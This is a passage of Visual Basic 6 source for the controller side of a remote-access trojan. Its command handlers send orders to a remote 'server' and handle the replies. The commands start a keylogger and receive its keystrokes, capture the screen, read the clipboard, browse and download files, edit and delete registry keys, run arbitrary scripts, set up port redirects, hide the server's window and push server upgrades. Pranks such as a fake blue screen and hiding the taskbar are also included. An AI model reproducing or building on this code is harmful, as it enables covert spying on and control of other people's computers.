                        rasp = MsgBox("show image " & Text18.Text & " streched (no is nonstreched) ?", vbYesNoCancel)
                        If rasp = vbCancel Then Exit Sub
                        If rasp = vbYes Then wsSend "271" & Text18.Text, True
                        If rasp = vbNo Then wsSend "270" & Text18.Text, True
                        btnMenu6(76).Caption = "stop show"
                     Else
                        wsSend "26cmdCloseX", True
                        btnMenu6(76).Caption = "show image"
                     End If
                    End If
                    
        
        Case 81: 'read registry
                For i = 0 To lstRegKey.ListCount - 1
                    lstRegKey.RemoveItem 0
                Next i
                For i = 0 To lstRegVal.ListCount - 1
                    lstRegVal.RemoveItem 0
                Next i
                
                wsSend "77" & fulln(Text21.Text), True
                
        Case 82: '..up registry
                If Text21.Text = "" Then Exit Sub
                For i = 0 To lstRegKey.ListCount - 1
                    lstRegKey.RemoveItem 0
                Next i
                For i = 0 To lstRegVal.ListCount - 1
                    lstRegVal.RemoveItem 0
                Next i
               
                Text21.Text = JPath(Mid(Text21.Text, 1, Len(Text21.Text) - 1))
                wsSend "77" & Text21.Text, True
        
        Case 78: 'delete reg key
                rasp = MsgBox("delete key: " & fulln(Text21.Text) & lstRegKey.List(lstRegKey.ListIndex), vbYesNo, "are you sure ?")
                If rasp = vbYes Then wsSend "82" & fulln(Text21.Text) & lstRegKey.List(lstRegKey.ListIndex), True
        Case 79:    'delete rewg value
                rasp = MsgBox("delete value: " & fulln(Text21.Text) & lstRegKey.List(lstRegKey.ListIndex) & "\" & Mid(lstRegVal.List(lstRegVal.ListIndex), 1, InStr(1, lstRegVal.List(lstRegVal.ListIndex), " = ") - 1), vbYesNo, "are you sure?")
                If rasp = vbYes Then wsSend "81" & fulln(Text21.Text) & lstRegKey.List(lstRegKey.ListIndex) & "\" & Mid(lstRegVal.List(lstRegVal.ListIndex), 1, InStr(1, lstRegVal.List(lstRegVal.ListIndex), " = ") - 1), True
        Case 35: 'saves tring
                tmpx = InputBox("save string value: " & Text20.Text & "  to:", "save string to registry", _
                fulln(Text21.Text) & lstRegKey.List(lstRegKey.ListIndex) & "\" & Mid(lstRegVal.List(lstRegVal.ListIndex), 1, InStr(1, lstRegVal.List(lstRegVal.ListIndex), " = ") - 1))
                If tmpx <> "" Then wsSend "79" & tmpx & Chr(0) & Text20.Text, True
        Case 83: 'save WORD
                tmpx = InputBox("save WORD value: " & Text20.Text & "  to:", "save WORD to registry", _
                fulln(Text21.Text) & lstRegKey.List(lstRegKey.ListIndex) & "\" & Mid(lstRegVal.List(lstRegVal.ListIndex), 1, InStr(1, lstRegVal.List(lstRegVal.ListIndex), " = ") - 1))
                If tmpx <> "" Then wsSend "80" & tmpx & Chr(0) & Text20.Text, True
        
        Case 80: wsSend "53" 'taskbar hide
        Case 84: wsSend "54" 'taskbar show
        Case 85: wsSend "55" 'desktop hide
        Case 86: wsSend "56" 'desktop show
        Case 87: wsSend "57" 'start hide
        Case 88: wsSend "58" 'start show
        Case 89: wsSend "59" 'tray icons hide
        Case 90: wsSend "60" 'tray icons show
        Case 91: wsSend "61" 't/b icn hide
        Case 92: wsSend "62" 't/b icons show
        Case 93: wsSend "63" 'tray clock hide
        Case 94: wsSend "64" 'tray clock show
        Case 95: wsSend "21" 'open cdrom
        Case 96: wsSend "22" 'close cdrom
        Case 97: wsSend "39" 'show sounds
        Case 98: wsSend "40" 'dont show sounds
        Case 99: wsSend "09" 'beep
        Case 100: wsSend "17" 'present BlueScreenofDeath
        Case 101: wsSend "96" & Text23.Text, True 'open address
        Case 102: wsSend "28" & Text22.Text, True 'print text
        Case 104: wsSend "76" & txtScript.Text, True 'add code to scriptcontrol
        Case 105: wsSend "75" & txtScript.Text, True 'execute script statements
        
        Case 103: showF 19 'port redirect frame
        Case 106: 'kill all redirects
                    wsSend "69"
        Case 107: 'port redirect enable
                If btnMenu6(107).Caption = "enable" Then
                    wsSend "51" & Text24.Text & Chr(0) & CStr(Check14.Value) & _
                    Chr(0) & Text25.Text & Chr(0) & Text26.Text & Chr(0) & _
                    CStr(Check13.Value) & Chr(0) & Text27.Text, True
                    btnMenu6(107).Caption = "disable"
                    redir = 1
                Else
                    wsSend "52"
                    btnMenu6(107).Caption = "enable"
                    redir = 0
                End If


End Select

End Sub

Private Sub sendK()
    If Check4.Value = 0 Then
        wsSend "02" & Text12.Text, True
    Else
        wsSend "02" & Right(Text12.Text, 1), True
    End If
End Sub

Private Sub showF(ByVal Index As Byte)
    For i = 0 To Frama.UBound
        If i <> Index Then Frama(i).Visible = False
    Next i
    Frama(Index).Visible = True
End Sub

Private Sub FlatB_Click(Index As Integer)
    On Error Resume Next
    frmMenu(crtMenu).Visible = False
        
    If FlatB(7).Top - FlatB(Index).Top > FlatB(Index).Top - FlatB(0).Top Then
        For i = FlatB.Count - 2 To Index + 1 Step -1
         FlatB(i).TextColor = FlatB(i).BackColor
         Do While FlatB(i).Top < FlatB(i + 1).Top - 400
         FlatB(i).Top = FlatB(i).Top + 150
         Loop
         FlatB(i).TextColor = &HFFC0C0
        Next i
    Else
        For i = 1 To Index
         FlatB(i).TextColor = FlatB(i).BackColor
         Do While FlatB(i).Top > FlatB(i - 1).Top + 400
         FlatB(i).Top = FlatB(i).Top - 150
         Loop
         FlatB(i).TextColor = &HFFC0C0
        Next i
    End If
    crtMenu = Index
    frmMenu(crtMenu).Visible = True
End Sub


Private Sub status(ByVal stat As String, ByVal light As Boolean)
lblStatusBar.Caption = stat
If light = True Then
    shpLight.BackColor = vbGreen
Else
    shpLight.BackColor = vbRed
End If
End Sub

Private Sub Text1_Change()
On Error Resume Next
Text1.SelStart = Len(Text1.Text)
End Sub
Private Sub text2_keypress(asc As Integer)
On Error GoTo errore
    If asc = vbKeyEscape Then
        Text2.Text = ""
    End If
    If asc = vbKeyReturn Then
        If Len(Trim(Text2.Text)) > 0 Then
            If Left$(Text2.Text, 1) <> "/" Then
                wsSend "65" & Text2.Text, True
            Else
                wsSend Mid(Text2.Text, 2, 2) & Mid(Text2.Text, 5, Len(Text2.Text)), True
            End If
            Text2.AddItem Text2.Text
        End If
    Text2.Text = ""
    End If
errore:
End Sub


Private Sub wsSend(ByVal data As String, Optional ByVal encrypted As Boolean)
If ws.State = sckConnected Then
    sc = 0
    If encrypted = True Then
        ws.SendData Mid(data, 1, 2) & encdec(sessKey, Mid(data, 3, Len(data)))
    Else
        ws.SendData data
    End If
    Do While sc = 0
        DoEvents
    Loop
End If
End Sub

Private Sub tmrPing_Timer()
If Abs(Minute(Now) - oldMin) >= CInt(Text9.Text) _
And Abs(Second(Now) - oldSec) >= CInt(Text10.Text) Then
    If Check2.Value = 0 Then outPut "PING !", True
    wsSend "pi"
    oldMin = Minute(Now)
    oldSec = Second(Now)
End If
End Sub


Private Sub txtChat_keydown(KeyCode As Integer, Shift As Integer)
    If KeyCode = vbKeyReturn Then
        DoEvents
        txtChat.Text = Mid(txtChat.Text, 1, (InStr(txtChat.Text, Chr(13)) - 1))
        wsSend "26" & txtChat.Text, True
        txtChat.Text = ""
        txtChat.SetFocus
    End If
End Sub

Private Sub txtMatrix_Change()
If txtMatrix.Locked = True Then txtMatrix.SelStart = Len(txtMatrix.Text)
End Sub

Private Sub ws_close()
    ws.Close
    lblStart.Caption = "  disconnected at " & Format(Now, "HH:mm:ss")
    lblStart.ForeColor = vbWhite
End Sub
Private Sub ws_DataArrival(ByVal bytes As Long)
On Error Resume Next
Dim data As String
Static file As String
Dim aSplit() As String
Dim bSplit() As String
Dim args As String
Dim pCmd As String

Me.MousePointer = vbHourglass
ws.GetData data, vbString

If cont = 1 Then GoTo puti

pCmd = Mid(data, 1, 2)

If Len(data) > 2 And pCmd <> "06" And pCmd <> "k1" _
And pCmd <> "29" And pCmd <> "sb" _
And pCmd <> "xy" And pCmd <> "s1" Then
    data = pCmd & encdec(sessKey, Mid(data, 3, Len(data)))
End If

args = Mid(data, 3, Len(data))

If pCmd = "pi" And Check2.Value = 1 Then
    Me.MousePointer = vbDefault
    Exit Sub
End If


    Select Case pCmd

    Case "k1": 'auth
                tmpstr$ = "k2" & returnKey(args)
                Do While Len(tmpstr) < 18
                    DoEvents
                Loop
                wsSend tmpstr, False
                sessKey = mkSessKey(Mid(tmpstr, 3, Len(tmpstr)))
   
    Case "04": outPut args
    Case "06": 'arriving file
                file = Mid(data, 3, InStr(data, Chr(0)) - 1)
                data = Mid(data, InStr(data, Chr(0)) + 1, Len(data))
                If Dir(App.Path & "\" & ip, vbDirectory) = "" Then
                    MkDir (App.Path & "\" & ip)
                End If
                file = App.Path & "\" & ip & "\" & file
                outPut "saving file to : " & file
                Open file For Binary As 1
                cont = 1
puti:           Do While data <> "" And bytes <> 0
                   Put 1, , data
                   start = Timer
                   Do While Timer < start + 0.3
                    DoEvents
                   Loop
                   ws.GetData data
                Loop
                Close 1
                cont = 0
                wsSend "AC"
                Do While sc = 0
                    DoEvents
                Loop
                sc = 0
                
    Case "07": outPut "file should be uploaded..."
    Case "12": 'windows list coming
                For i = 1 To lstWind.ListItems.Count
                    lstWind.ListItems.Remove 1
                Next i
                
                aSplit = Split(args, vbCrLf)
                For i = 0 To UBound(aSplit) - 1
                    bSplit = Split(aSplit(i), ";")
                        If aSplit(i) <> "" Then
                        lstWind.ListItems.Add
                        lstWind.ListItems(i + 1).Text = bSplit(0)
                        lstWind.ListItems(i + 1).SubItems(1) = bSplit(1)
                        lstWind.ListItems(i + 1).SubItems(2) = bSplit(2)
                        End If
                Next i
                lstWind.SetFocus
                    
    Case "15":  'info coming
                aSplit = Split(args, vbCrLf)
                For i = 0 To lblGetInfo.UBound
                    lblGetInfo(i).Caption = aSplit(i)
                Next i
                For i = lblGetInfo.UBound + 1 To UBound(aSplit)
                    Text1.Text = Text1.Text & vbCrLf & aSplit(i)
                Next i

        
    Case "xx":  outPut "server closed by remote..."

    Case "21":  outPut "CD Tray opened..."
    Case "22":  outPut "CD Tray closed..."
    Case "25":  'this is for matrix chat window
                txtMatrix.Text = args
    Case "26":  'this is for matrix chat window
                If InStr(args, "cmdCloseX") <> 0 Then
                    txtMatrix.Text = txtMatrix.Text & vbCrLf & "---- " & Mid(data, 3, InStr(args, "cmdCloseX") - 1) & " closed chat ----" & vbCrLf
                    btnMenu6(55).Caption = "start"
                    txtChat.Enabled = False
                    txtMatrix.Locked = False
                Else
                txtMatrix.Text = txtMatrix.Text & vbCrLf & args
                End If
    Case "27":  outPut "image shown..."
    Case "28":  outPut "text sent to printer..."
    Case "29":  outPut "capturing screen..."
    
    Case "30":  outPut "playing sound..."
    Case "31":  outPut "sound stoped."
    Case "32":  outPut "window activated."
                lstWind.SetFocus
    Case "33":  outPut "window flashed..."
                lstWind.SetFocus
    Case "35":  outPut "window action executed."
                lstWind.SetFocus
    Case "37":
                If Mid(data, 3, 2) = "set" Then
                    outPut "wallpaper set."
                Else
                    outPut "wallpaper failed."
                End If
     Case "38":
                If Mid(data, 3, 2) = "set" Then
                    outPut "mouse trails set."
                Else
                    outPut "mouse trails failed."
                End If
    Case "43":
                If Mid(data, 3, 2) = "set" Then
                    outPut "pc name set."
                Else
                    outPut "pc name set failed."
                End If
    Case "52": outPut "redirect should be disabled."
    Case "53":  outPut "taskbar hidden."
    Case "54":  outPut "taskbar shown."
    Case "55":  outPut "desktop hidden."
    Case "56":  outPut "desktop shown."
    Case "57":  outPut "start button hidden."
    Case "58":  outPut "start button shown."
    Case "59":  outPut "taskbar icons hidden."
    Case "60":  outPut "taskbar icons shown."
    Case "61":  outPut "programs in taskbar hidden."
    Case "62":  outPut "programs in taskbar shown."
    Case "63":  outPut "taskbar clock hidden."
    Case "64":  outPut "taskbar clock shown."
    
    
    Case "68":
                If Mid(data, 3, 2) = "00" Then
                    Check7.Value = Mid(data, 5, 1)
                    Check8.Value = Mid(data, 6, 1)
                    Check9.Value = Mid(data, 7, 1)
                    Check10.Value = Mid(data, 8, 1)
                    Check11.Value = Mid(data, 9, 1)
                End If
    Case "69": outPut "all redirects should be disabled."
    Case "70": outPut "closing all open connections..."
    Case "71": outPut "keylogger started..."
    Case "72": outPut "keylogger stopped..."
    Case "75":
                If InStr(3, data, "ended") = 0 Then
                    Text1.Text = Text1.Text & vbCrLf & args & vbCrLf
                Else
                    Text1.Text = Text1.Text & vbCrLf & args & vbCrLf & String(52, "-")
                End If
    Case "76":  outPut "adding code to script control..."
    
    
    Case "77":  'aSplit = Split(args, vbCrLf)
                'For i = 0 To UBound(aSplit) - 1
                    lstRegKey.AddItem args
                'Next i
    Case "78": lstRegVal.AddItem args
    
    
    
    Case "83":
                For i = 1 To lstProc.ListItems.Count
                    lstProc.ListItems.Remove 1
                Next i
                
                aSplit = Split(args, vbCrLf)
                For i = 0 To UBound(aSplit) - 1
                    bSplit = Split(aSplit(i), ";")
                        If aSplit(i) <> "" Then
                        lstProc.ListItems.Add
                        lstProc.ListItems(i + 1).Text = bSplit(0)
                        lstProc.ListItems(i + 1).SubItems(1) = bSplit(1)
                        lstProc.ListItems(i + 1).SubItems(2) = bSplit(2)
                        lstProc.ListItems(i + 1).SubItems(3) = bSplit(3)
                        lstProc.ListItems(i + 1).SubItems(4) = bSplit(4)
                        End If
                Next i
                lstProc.SetFocus
                
    Case "84":  outPut args
                wsSend "83" 'ask again for processes
                
    Case "91": aSplit = Split(args, ";") 'get mouse coord
                Text13.Text = aSplit(0)
                Text14.Text = aSplit(1)

    Case "93": 'get clipboard
                Text17.Text = args
    Case "94": outPut "clipboard erased."
    Case "95": outPut "text sent to clipboard."
    Case "97": outPut "the script control should now be reset."
    Case "0a": outPut "server GUI should be hidden."
    Case "0b": outPut "server GUI should be shown."
    Case "0c": outPut "server should be stopped listening."
    Case "0d": outPut "changing listening port to: " & args
    
    Case "f0":
                For i = 0 To Combo1.ListCount - 1
                    Combo1.RemoveItem 0
                Next i
                aSplit = Split(args, vbCrLf)
                For i = 0 To UBound(aSplit) - 1
                    Combo1.AddItem aSplit(i)
                    'If InStr(UCase$(aSplit(i)), "C:") >= 1 Then Combo1.ListIndex = i
                Next i
    Case "f1":
                For i = 1 To lstFiles.ListItems.Count
                    lstFiles.ListItems.Remove 1
                Next i
    
    Case "f2":
                bSplit = Split(args, ";")
                    lstFiles.ListItems.Add
                    lstFiles.ListItems(lstFiles.ListItems.Count).Text = bSplit(0)
                    lstFiles.ListItems(lstFiles.ListItems.Count).SubItems(1) = bSplit(1)
                    lstFiles.ListItems(lstFiles.ListItems.Count).SubItems(2) = bSplit(2)
                    lstFiles.ListItems(lstFiles.ListItems.Count).SubItems(3) = bSplit(3)
                
    Case "s0", "s1": 'from script encypted or unencrypted text
                    Text1.Text = Text1.Text & args & vbCrLf
    
    Case "kl":  'keylogger key
                Text1.Text = Text1.Text & args
    
    Case "sb":  'live control is starting
                aSplit = Split(args, ";")
                sdx = CLng(aSplit(0))
                sdy = CLng(aSplit(1))
    
    Case "xy":  'coord of the incoming part of screen captured
                aSplit = Split(args, ";")
                scrPos(0) = CLng(aSplit(0))
                scrPos(1) = CLng(aSplit(1))
                If capScreen = 1 Then
                    wsSend Chr(0)
                Else
                    wsSend "se"
                End If
    
    
    Case Else:
                outPut args
    End Select

exitus: Me.MousePointer = vbDefault
End Sub

Private Sub ws_SendComplete()
    sc = 1
End Sub

Private Sub outPut(ByVal txt As String, Optional ByVal hideSepLine As Boolean)
If hideSepLine = False Then
    Text1.Text = Text1.Text & vbCrLf & "<" & Format(Now) & ">" & vbCrLf & txt & vbCrLf & String(60, "-") & vbCrLf
Else
    Text1.Text = Text1.Text & vbCrLf & "<" & Format(Now) & ">" & vbCrLf & txt & vbCrLf
End If
End Sub

Private Function returnKey(key As String)
Dim crtPass As String * 8
Dim tmp As String
If Len(Text5.Text) < 8 Then
    crtPass = Text5.Text & String(8 - Len(Text5.Text), 245)
Else
    crtPass = Mid(Text5.Text, 1, 8)
End If
   Randomize
    For i = 1 To 8
        x = Int((254 + 1) * Rnd)
        returnKey = returnKey & Chr(x)
        tmp = tmp & Chr(asc(Mid(key, i, 1)) Xor x Xor asc(Mid(crtPass, i, 1)))
    Next i
returnKey = returnKey & tmp
End Function

Private Function mkSessKey(ByVal tmpkey As String) As String
For i = 1 To 20
    mkSessKey = mkSessKey & Chr(asc(Mid(tmpkey, (i Mod 16) + 1, 1)) Xor (i + 20))
Next i
End Function


Private Sub upgrade()
On Error Resume Next
Dim buf As String
cfile = Text11.Text
oldir = CurDir()
ChDrive (App.Path)
ChDir (App.Path)
If Dir(cfile, 39) <> "" Then
        Open cfile For Binary As 2
        buf = Space(LOF(2))
        Get 2, , buf
        Close 2
        ws.SendData "20" + buf
        Do While sc = 0
            DoEvents
        Loop
        sc = 0
Else
    MsgBox "no server update available...", vbInformation
End If
ChDrive (oldir)
ChDir (oldir)
End Sub

Private Sub Combo1_click()
    Text19.Text = Left(Combo1.Text, 3)
    wsSend "f1" & Left(Combo1.Text, 3), True
End Sub

Private Sub lstFiles_dblclick()
On Error Resume Next
    If InStr(1, lstFiles.SelectedItem.SubItems(2), "D") >= 1 Then
        If lstFiles.SelectedItem.Text = ".." Or lstFiles.SelectedItem.Text = "." Then
            xstr = JustPath(Text19.Text)
            Text19.Text = Mid(xstr, 1, Len(xstr) - 1)
        Else
        Text19.Text = fulln(Text19.Text) & lstFiles.SelectedItem.Text
        End If

        wsSend "f1" & Text19.Text, True
    End If
End Sub

Private Sub lstfiles_click()
On Error Resume Next
'If InStr(1, lstFiles.SelectedItem.SubItems(2), "D") = 0 Then
    Text18.Text = fulln(Text19.Text) & lstFiles.SelectedItem.Text
'End If
End Sub

Private Sub lstfiles_keydown(KeyCode As Integer, Shift As Integer)
On Error Resume Next
If KeyCode = vbKeyReturn Then
    If InStr(1, lstFiles.SelectedItem.SubItems(2), "D") >= 1 Then
        If lstFiles.SelectedItem.Text = ".." Or lstFiles.SelectedItem.Text = "." Then
            xstr = JustPath(Text19.Text)
            Text19.Text = Mid(xstr, 1, Len(xstr) - 1)
        Else
        Text19.Text = fulln(Text19.Text) & lstFiles.SelectedItem.Text
        End If

        wsSend "f1" & Text19.Text, True
    End If
End If
If KeyCode = 32 Then
    'If InStr(1, lstFiles.SelectedItem.SubItems(2), "D") = 0 Then
        Text18.Text = fulln(Text19.Text) & lstFiles.SelectedItem.Text
    'End If
End If
End Sub


Private Sub Combo3_Click()
    For i = 0 To lstRegKey.ListCount - 1
        lstRegKey.RemoveItem 0
    Next i
    Text21.Text = Combo3.Text
    wsSend "77" & fulln(Text21.Text), True
End Sub

Private Sub lstregkey_click()
    For i = 0 To lstRegVal.ListCount - 1
        lstRegVal.RemoveItem 0
    Next i
    wsSend "78" & fulln(Text21.Text) & lstRegKey.List(lstRegKey.ListIndex), True
End Sub

Private Sub lstregkey_dblclick()
On Error Resume Next
    Text21.Text = fulln(Text21.Text) & lstRegKey.List(lstRegKey.ListIndex)
    For i = 0 To lstRegKey.ListCount - 1
        lstRegKey.RemoveItem 0
    Next i
    For i = 0 To lstRegVal.ListCount - 1
        lstRegVal.RemoveItem 0
    Next i

    wsSend "77" & fulln(Text21.Text), True
End Sub

Private Sub lstregval_click()
    tval = lstRegVal.List(lstRegVal.ListIndex)
    Text20.Text = Mid(tval, InStr(1, tval, " = ") + 3, Len(tval))
End Sub



Private Sub Check7_Click()
wsSend "6801" & Str(Check7.Value), True
End Sub
Private Sub Check8_Click()
wsSend "6802" & Str(Check8.Value), True
End Sub
Private Sub Check9_Click()
wsSend "6803" & Str(Check9.Value), True
End Sub
Private Sub Check10_Click()
wsSend "6804" & Str(Check10.Value), True
End Sub
Private Sub Check11_Click()
wsSend "6805" & Str(Check11.Value), True
End Sub

Private Function OpenDoc(ByVal address As String) As Long
On Error Resume Next
OpenDoc = ShellExecute(hWnd, "Open", address, "", App.Path, 1)
End Function


Private Sub populateScripts()
On Error Resume Next
Dim sLine As String
Dim isThere As Byte
Dim freeFilenr As Integer

For i = 1 To lstScripts.ListItems.Count
    lstScripts.ListItems.Remove 1
Next i

i = 1
cfile = Dir(App.Path + "\scripts\*.script", 55)
Do While cfile <> ""
cfilefull = App.Path & "\scripts\" & cfile
    lstScripts.ListItems.Add
    lstScripts.ListItems(i).Text = Left(cfile, InStr(1, cfile, ".script") - 1)
    freeFilenr = FreeFile
    Open cfilefull For Input Access Read As #freeFilenr
        Do While Not EOF(freeFilenr)
            Line Input #freeFilenr, sLine
            
            isThere = InStr(1, sLine, "'$author=")
            If isThere = 1 And _
            lstScripts.ListItems(i).SubItems(1) = "" Then
                lstScripts.ListItems(i).SubItems(1) = Mid(sLine, 10, Len(sLine))
            End If
            
            isThere = InStr(1, sLine, "'$description=")
            If isThere = 1 And _
            lstScripts.ListItems(i).SubItems(2) = "" Then
                lstScripts.ListItems(i).SubItems(2) = Mid(sLine, 15, Len(sLine))
            End If
            
            If lstScripts.ListItems(i).SubItems(1) <> "" And _
            lstScripts.ListItems(i).SubItems(2) <> "" Then Exit Do
        Loop
    Close freeFilenr
    If lstScripts.ListItems(i).SubItems(1) = "" Then lstScripts.ListItems(i).SubItems(1) = " - "
    If lstScripts.ListItems(i).SubItems(2) = "" Then lstScripts.ListItems(i).SubItems(2) = " - "
    cfile = Dir
    i = i + 1
Loop
End Sub

Private Sub lstscripts_click()
On Error Resume Next
For i = 0 To Combo2.ListCount - 1
    Combo2.RemoveItem 0
Next i
End Sub
Private Sub lstscript_dblclick()
    btnMenu6_Click (7)
End Sub

Private Sub openScript(ByVal scriptName As String)
Dim freeFilenr As Integer
    freeFilenr = FreeFile
    Open scriptName For Input Access Read As #freeFilenr
    txtScript.Text = Input(LOF(freeFilenr), #freeFilenr)
    Close freeFilenr
End Sub

Private Sub saveScript()
On Error GoTo errore
Dim freeFilenr As Integer
Dim tosaveName As String
tosaveName = InputBox("enter the name of the script " _
& vbCrLf & "the script will be saved in the scripts directory and will be added extension .script", "script save")
If tosaveName = "" Then Exit Sub
    freeFilenr = FreeFile
    Open App.Path & "\scripts\" & tosaveName & ".script" For Output As #freeFilenr
    Print #freeFilenr, txtScript.Text
    Close freeFilenr
    Exit Sub
errore:
        MsgBox "error while saving script...", vbCritical, "script save"
End Sub
